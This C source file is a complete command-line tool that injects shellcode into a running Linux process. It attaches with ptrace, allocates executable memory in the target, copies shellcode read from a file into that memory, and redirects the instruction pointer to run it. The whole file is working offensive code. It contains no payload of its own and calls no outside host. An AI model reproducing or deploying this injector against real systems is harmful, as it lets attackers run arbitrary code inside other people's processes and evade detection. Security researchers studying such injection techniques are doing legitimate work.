#include "traceter/traceter.h"
#include "traceter/p_trace.h"
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#define SYSCALL_SIZE 2

void print_regs(struct user_regs_struct *regs) {
  printf("orig_rax: 0x%llx\n", regs->orig_rax);
  printf("rax: 0x%llx\n", regs->rax);
  printf("rbx: 0x%llx\n", regs->rbx);
  printf("rcx: 0x%llx\n", regs->rcx);
  printf("rdx: 0x%llx\n", regs->rdx);
  printf("rsi: 0x%llx\n", regs->rsi);
  printf("rdi: 0x%llx\n", regs->rdi);
  printf("rbp: 0x%llx\n", regs->rbp);
  printf("rsp: 0x%llx\n", regs->rsp);
  printf("r8: 0x%llx\n", regs->r8);
  printf("r9: 0x%llx\n", regs->r9);
  printf("r10: 0x%llx\n", regs->r10);
  printf("r11: 0x%llx\n", regs->r11);
  printf("r12: 0x%llx\n", regs->r12);
  printf("r13: 0x%llx\n", regs->r13);
  printf("r14: 0x%llx\n", regs->r14);
  printf("r15: 0x%llx\n", regs->r15);
  printf("rip: 0x%llx\n", regs->rip);
  printf("eflags: 0x%llx\n", regs->eflags);
  printf("cs: 0x%llx\n", regs->cs);
  printf("ss: 0x%llx\n", regs->ss);
  printf("ds: 0x%llx\n", regs->ds);
  printf("es: 0x%llx\n", regs->es);
  printf("fs: 0x%llx\n", regs->fs);
  printf("gs: 0x%llx\n", regs->gs);
}

int inject_shc_in_process(pid_t pid, unsigned char* shc, size_t size) {
    int err = -1;
    unsigned long rip = 0;
    void* mmap_addr = NULL;
    struct user_regs_struct regs = { 0 };
    trace_session_t *session =
        init_trace_session(pid);
    unsigned long rip_offset = 0;
    if (!session) {
        printf("Unable to start ptrace session\n");
        goto close;
    }

    if (ptrace_getregs(session->pid, &regs)) {
      printf("Unable to get registers\n");
      goto close;
    }

    // print_regs(&regs);
    if (regs.orig_rax != -1) {
        // we are in a syscall so when we detach, we have to
        // reexecute it
        rip_offset = SYSCALL_SIZE;
        /* printf("Executing single step to get out of syscall\n"); */
        /* if (ptrace_singlestep(session->pid)) { */
        /*     printf("Error executing single step\n"); */
        /*     goto close; */
        /* } */

        /* if (waitpid(session->pid, 0, 0) != session->pid) { */
        /*     printf("Error waiting for syscall\n"); */
        /*     goto close; */
        /* } */
    }

    mmap_addr = exec_mmap(
        session, NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
        );
    if(!mmap_addr) {
        printf("Error executing mmap\n");
        goto close;
    }
    printf("Allocated map at %p\n", mmap_addr);

    if(pt_copy_to_target(session, mmap_addr, shc, size) == -1) {
        printf("Error copying shellcode to target\n");
        goto close;
    }

    rip = pt_get_rip(session);
    if(rip == -1) {
        printf("Unable to get rip\n");
        goto close;
    }

    // rip_offset explanation:
    // If we are in a syscall, we need to reexecute the syscall
    // , so we use the rip_offset
    if(pt_push(session, rip - rip_offset) != 0) {
        printf("Unable to push return address\n");
        goto close;
    }

    // rip_offset explanation:
    // If we are in a syscall, when we detach, the rip will be substracted
    // the syscall size, so in a regular environmet, the syscall will
    // be reexecuted. We need to take this into account when setting
    // the next rip.
    if(pt_set_rip(session, (unsigned long)mmap_addr + rip_offset)) {
        printf("Unable to set rip\n");
        goto close;
    }

    err = 0;
  close:
    if(session) {
        terminate_session(&session);
    }
    return err;
}

unsigned char *read_file_into_bytes(char *filepath, size_t *size) {
  FILE *fp;
  unsigned char *buffer;
  long filelen;

  fp = fopen(filepath, "rb"); // Open the file in binary mode
  if (!fp) {
    return 0;
  }
  fseek(fp, 0, SEEK_END); // Jump to the end of the file
  filelen = ftell(fp);    // Get the current byte offset in the file
  rewind(fp);             // Jump back to the beginning of the file

  buffer = (unsigned char *)malloc(filelen); // Enough memory for the file
  if(!buffer) {
      return NULL;
  }
  fread(buffer, filelen, 1, fp);             // Read in the entire file
  fclose(fp);

  *size = filelen;
  return buffer; // Close the file
}

int main(int argc, char** argv) {
    int err = -1;
    pid_t pid = 0;
    size_t size = 0;
    unsigned char* shc = NULL;
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <shellcode-file> <pid>\n", argv[0]);
        goto close;
    }

    pid = atoi(argv[2]);
    printf("File: %s\n", argv[1]);
    printf("Pid: %d\n", pid);

    shc = read_file_into_bytes(argv[1], &size);
    if (!shc) {
      printf("Unable to read shellcode file\n");
      goto close;
    }

    if(inject_shc_in_process(pid, shc, size) != 0) {
        printf("Error injecting shellcode in process\n");
        goto close;
    }

  err = 0;
  close:
    if(shc) {
        free(shc);
    }
    return err;
}
